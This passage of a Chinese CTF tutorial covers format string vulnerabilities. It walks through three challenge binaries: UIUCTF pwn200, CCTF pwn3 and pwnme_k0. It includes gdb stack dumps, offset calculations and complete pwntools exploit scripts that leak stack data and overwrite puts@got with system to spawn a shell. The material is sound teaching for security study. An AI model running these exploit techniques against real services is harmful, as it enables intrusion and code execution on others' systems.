+<p>这里，我们以2017年的UIUCTF中pwn200 GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。</p>
+<h4 id="_4">确定保护<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span>➜  <span class="m">2017</span>-UIUCTF-pwn200-GoodLuck git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec goodluck
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</pre></div>
+
+<p>可以看出程序开启了NX保护以及部分RELRO保护。</p>
+<h4 id="_5">分析程序<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>可以发现，程序的漏洞很明显</p>
+<div class="codehilite"><pre><span></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v5</span> <span class="o">=</span> <span class="n">format</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span> <span class="o">||</span> <span class="n">v11</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You answered:&quot;</span><span class="p">);</span>
+      <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">But that was totally wrong lol get rekt&quot;</span><span class="p">);</span>
+      <span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">goto</span> <span class="n">LABEL_11</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</pre></div>
+
+<h4 id="_6">确定偏移<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>我们在printf处下偏移如下,这里只关注代码部分与栈部分。</p>
+<div class="codehilite"><pre><span></span>gef➤  b <span class="nb">printf</span>
+Breakpoint <span class="m">1</span> at 0x400640
+gef➤  r
+Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
+what<span class="s1">&#39;s the flag</span>
+<span class="s1">123456</span>
+<span class="s1">You answered:</span>
+
+<span class="s1">Breakpoint 1, __printf (format=0x602830 &quot;123456&quot;) at printf.c:28</span>
+<span class="s1">28  printf.c: 没有那个文件或目录.</span>
+
+<span class="s1">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span>
+<span class="s1">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8</span>
+<span class="s1">   0x7ffff7a627fe &lt;fprintf+142&gt;    ret    </span>
+<span class="s1">   0x7ffff7a627ff                  nop    </span>
+<span class="s1"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8</span>
+<span class="s1">   0x7ffff7a62807 &lt;printf+7&gt;       test   al, al</span>
+<span class="s1">   0x7ffff7a62809 &lt;printf+9&gt;       mov    QWORD PTR [rsp+0x28], rsi</span>
+<span class="s1">   0x7ffff7a6280e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x30], rdx</span>
+<span class="s1">───────────────────────────────────────────────────────────────────────[ stack ]────</span>
+<span class="s1">[&#39;</span>0x7fffffffdb08<span class="s1">&#39;, &#39;</span>l8<span class="err">&#39;</span><span class="o">]</span>
+<span class="m">8</span>
+0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← <span class="nv">$rsp</span>
+0x00007fffffffdb10│+0x08: 0x0000000031000001
+0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 <span class="o">(</span><span class="s2">&quot;123456&quot;</span>?<span class="o">)</span>
+0x00007fffffffdb20│+0x18: 0x0000000000602010  →  <span class="s2">&quot;You answered:\ng&quot;</span>
+0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  <span class="s2">&quot;flag{11111111111111111&quot;</span>
+0x00007fffffffdb30│+0x28: <span class="s2">&quot;flag{11111111111111111&quot;</span>
+0x00007fffffffdb38│+0x30: <span class="s2">&quot;11111111111111&quot;</span>
+0x00007fffffffdb40│+0x38: 0x0000313131313131 <span class="o">(</span><span class="s2">&quot;111111&quot;</span>?<span class="o">)</span>
+──────────────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────
+<span class="o">[</span><span class="c1">#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 &quot;123456&quot;)</span>
+<span class="o">[</span><span class="c1">#1] 0x400890 → Name: main()</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></div>
+
+<p>可以看到flag对应的栈上的偏移为5，除去对应的第一行为返回地址外，其偏移为4。此外，由于这是一个64位程序，所以前6个参数存在在对应的寄存器中，fmt字符串存储在RDI寄存器中，所以fmt字符串对应的地址的偏移为10。而fmt字符串中%order<span><span class="MathJax_Preview">s对应的order为fmt字符串后面的参数的顺序，所以我们只需要输入%9\</span><script type="math/tex">s对应的order为fmt字符串后面的参数的顺序，所以我们只需要输入%9\</script></span>s即可得到flag的内容。当然，我们还有更简单的方法利用https://github.com/scwuaptx/Pwngdb中的fmtarg来判断某个参数的偏移。</p>
+<div class="codehilite"><pre><span></span>gef➤  fmtarg 0x00007fffffffdb28
+The index of format argument : <span class="m">10</span>
+</pre></div>
+
+<p>需要注意的是我们必须break在printf处。</p>
+<h4 id="_7">利用程序<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">goodluck</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.sniperoj.cn&#39;</span><span class="p">,</span> <span class="mi">30017</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s&quot;</span>
+<span class="k">print</span> <span class="n">payload</span>
+<span class="c1">##gdb.attach(sh)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h2 id="hijack-got">hijack GOT<a class="headerlink" href="#hijack-got" title="Permanent link">&para;</a></h2>
+<h3 id="_8">原理<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>在目前的C程序中，libc中的函数都是通过GOT表来跳转的。此外，在 没有开启RELRO保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此，我们可以修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。比如说我们可以修改printf的got表项内容为system函数的地址。从而，程序在执行printf的时候实际执行的是system函数。</p>
+<p>假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤</p>
+<ul>
+<li>
+<p>确定函数A的GOT表地址。</p>
+</li>
+<li>
+<p>这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</p>
+</li>
+<li>
+<p>确定函数B的内存地址</p>
+</li>
+<li>
+<p>这一步通常来说，需要我们自己想办法来泄露对应函数B的地址。</p>
+</li>
+<li>
+<p>将函数B的内存地址写入到函数A的GOT表地址处。</p>
+</li>
+<li>
+<p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
+<ul>
+<li>写入函数：write函数。</li>
+<li>ROP</li>
+</ul>
+<p><div class="codehilite"><pre><span></span>pop eax; ret;           # printf@got -&gt; eax
+pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
+add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
+</pre></div>
+- 格式化字符串任意地址写</p>
+</li>
+</ul>
+<h3 id="_9">例子<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>这里我们以2016 CCTF中的pwn3为例进行介绍。</p>
+<h4 id="_10">确定保护<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>如下</p>
+<div class="codehilite"><pre><span></span>➜  <span class="m">2016</span>-CCTF-pwn3 git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec pwn3 
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</pre></div>
+
+<p>可以看出程序主要开启了NX保护。我们一般默认远程都是开启ASLR保护的。</p>
+<h4 id="_11">分析程序<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
+<p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的ftp，具有get，put，dir三个基本功能。大概浏览一下每个功能的代码，发现在get功能中存在格式化字符串漏洞</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-FCh]@5</span>
+  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [sp+E4h] [bp-34h]@1</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+10Ch] [bp-Ch]@3</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;enter the file name you want to get:&quot;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%40s&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&quot;flag&quot;</span><span class="p">,</span> <span class="mi">4u</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;too young, too simple&quot;</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">file_head</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<h4 id="_12">漏洞利用思路<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p>
+<ul>
+<li>绕过密码</li>
+<li>确定格式化字符串参数偏移</li>
+<li>利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。</li>
+<li>修改puts@got的内容为system的地址。</li>
+<li>当程序再次执行puts函数的时候，其实执行的是system函数。</li>
+</ul>
+<h4 id="_13">漏洞利用程序<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>如下</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
+<span class="n">pwn3</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+
+<span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show_dir</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+
+
+<span class="n">tmp</span> <span class="o">=</span> <span class="s1">&#39;sysbdmin&#39;</span>
+<span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
+    <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+
+<span class="c1">## password</span>
+<span class="k">def</span> <span class="nf">password</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+
+<span class="c1">##password</span>
+<span class="n">password</span><span class="p">()</span>
+<span class="c1">## get the addr of puts</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">pwn3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts got : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
+<span class="n">put</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
+
+<span class="c1">## get addr of system</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&quot;puts&quot;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">puts_offset</span> <span class="o">+</span> <span class="n">system_offset</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+
+<span class="c1">## modify puts@got, point to system_addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>
+<span class="n">put</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
+<span class="c1">##gdb.attach(sh)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
+
+<span class="c1">## system(&#39;/bin/sh&#39;)</span>
+<span class="n">show_dir</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p>注意</p>
+<ul>
+<li>我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。</li>
+<li>这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got: system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。</li>
+</ul>
+<h2 id="hijack-retaddr">hijack retaddr<a class="headerlink" href="#hijack-retaddr" title="Permanent link">&para;</a></h2>
+<h3 id="_14">原理<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<p>很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
+<h3 id="_15">例子<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<p>这里我们以三个白帽-pwnme_k0为例进行分析。</p>
+<h4 id="_16">确定保护<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span>➜  三个白帽-pwnme_k0 git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec pwnme_k0
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</pre></div>
+
+<p>可以看出程序主要开启了NX保护以及Full RELRO保护。这我们就没有办法修改程序的got表了。</p>
+<h4 id="_17">分析程序<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<p>简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">__usercall</span> <span class="n">sub_400B07</span><span class="err">@</span><span class="o">&lt;</span><span class="n">eax</span><span class="o">&gt;</span><span class="p">(</span><span class="kt">char</span> <span class="n">format</span><span class="err">@</span><span class="o">&lt;</span><span class="n">dil</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&quot;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">formata</span><span class="p">,</span> <span class="s">&quot;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>其输出的内容为&amp;a4+4。我们回溯一下，发现我们读入的passwrod内容也是</p>
+<div class="codehilite"><pre><span></span>    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+</pre></div>
+
+<p>当然我们还可以发现我们读入的username在距离的password20个字节。</p>
+<div class="codehilite"><pre><span></span>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your username(max lenth:20): &quot;</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bufa</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&amp;&amp;</span> <span class="n">v8</span> <span class="o">&lt;=</span> <span class="mh">0x14u</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your password(max lenth:20): &quot;</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">=</span> <span class="n">bufa</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
+</pre></div>
+
+<p>好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。</p>
+<h4 id="_18">利用思路<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
+<p>我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。</p>
+<p>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下</p>
+<ul>
+<li>确定偏移</li>
+<li>获取函数的rbp与返回地址</li>
+<li>根据相对偏移获取存储返回地址的地址</li>
+<li>将执行system函数调用的地址写入到存储返回地址的地址。</li>
+</ul>
+<h4 id="_19">确定偏移<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<p>首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&amp;a4 + 4)函数处</p>
+<div class="codehilite"><pre><span></span>Register Account first!
+Input your username(max lenth:20): 
+aaaaaaaa
+Input your password(max lenth:20): 
+%p%p%p%p%p%p%p%p%p%p
+Register Success!!
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+&gt;error options
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+&gt;1
+...
+</pre></div>
+
+<p>此时栈的情况为</p>
+<div class="codehilite"><pre><span></span>─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+     0x400b1a                  call   0x400758
+     0x400b1f                  lea    rdi, [rbp+0x10]
+     0x400b23                  mov    eax, 0x0
+ →   0x400b28                  call   0x400770
+   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
+        0x400776                  xchg   ax, ax
+        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
+        0x40077e                  xchg   ax, ax
+────────────────────────────────────────────────────────────────────[ stack ]────
+0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;
+0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+</pre></div>
+
+<p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。</p>
+<h4 id="_20">修改地址<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<p>我们再仔细观察下断点处栈的信息</p>
+<div class="codehilite"><pre><span></span>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;
+0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+</pre></div>
+
+<p>可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。</p>
+<p>与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。</p>
